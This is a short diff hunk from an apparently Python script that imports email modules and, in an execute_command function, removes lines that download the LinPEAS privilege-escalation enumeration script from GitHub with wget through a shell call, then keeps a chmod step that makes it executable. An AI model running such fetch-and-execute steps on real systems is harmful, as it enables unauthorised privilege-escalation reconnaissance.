@@ -4,9 +4,6 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
 def execute_command():
-    # Download the script using wget
-    download_command = "wget -O linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_small.sh"
-    subprocess.run(download_command, shell=True, check=True)
 
     # Make the script executable
     chmod_command = "chmod +x linpeas.sh"
